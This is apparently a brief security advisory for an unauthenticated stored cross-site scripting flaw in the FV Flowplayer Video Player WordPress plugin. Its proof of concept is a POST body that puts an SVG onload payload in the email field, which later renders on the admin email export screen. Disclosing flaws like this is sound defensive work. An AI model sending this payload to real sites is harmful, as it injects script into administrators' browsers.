# FV Flowplayer Video Player <= 7.3.13.727 - Unauthenticated Stored XSS
Description

The vulnerable function is exposed to unauthenticated users over `wp_ajax_nopriv_fv_wp_flowplayer_email_signup` ajax hook. It saves anything that user provides in `email` POST parameter.

# Proof of Concept
```
Send POST request to wp-admin/admin-ajax.php with body content:



"action=fv_wp_flowplayer_email_signup&list=1&email=<svg/onload=prompt(1)>@test.com"



The provided email input is then rendered on email export screen. 
```
